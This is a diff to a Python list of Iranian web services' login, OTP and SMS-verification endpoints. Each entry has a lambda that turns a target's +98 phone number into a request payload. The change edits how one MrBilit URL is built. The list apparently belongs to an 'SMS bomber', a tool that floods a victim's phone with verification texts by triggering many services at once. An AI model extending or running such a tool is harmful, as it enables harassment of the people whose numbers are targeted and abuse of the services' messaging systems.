@@ -51,7 +51,7 @@ SERVICES_LIST = [
     {'name': 'GSM.ir', 'url': 'https://marketplace.gsm.ir/api/v1/user/login/', 'method': 'POST', 'data': lambda phone: {"phone_number": "+98" + phone.split("+98")[1]}, 'json': True},
     {'name': 'Haal', 'url': 'https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist', 'method': 'POST', 'data': lambda phone: {"Mobile": "0" + phone.split("+98")[1]}, 'json': True},
     {'name': 'HamyarWP', 'url': 'https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081', 'method': 'POST', 'data': lambda phone: {"username": "0" + phone.split("+98")[1]}, 'json': False},
-    {'name': 'MrBilit SMS', 'url': 'https://content.mrbilit.ir/sms/get_app/send?to=0' + phone.split("+98")[1], 'method': 'POST', 'data': lambda phone: {}, 'json': False},
+    {'name': 'MrBilit SMS', 'url': 'https://content.mrbilit.ir/sms/get_app/send?to=0{phone}', 'method': 'POST', 'data': lambda phone: {}, 'json': False},
     {'name': 'Pezeshket', 'url': 'https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2', 'method': 'POST', 'data': lambda phone: {"mobileNumber": "0" + phone.split("+98")[1]}, 'json': True},
     {'name': 'Ring', 'url': 'https://ring.ir/api/v1/auth/otp', 'method': 'POST', 'data': lambda phone: {"mobile": "+98" + phone.split("+98")[1]}, 'json': True},
     {'name': 'Roboo', 'url': 'https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0' + phone.split("+98")[1] + '&code=1302817798429812', 'method': 'POST', 'data': lambda phone: {}, 'json': False},
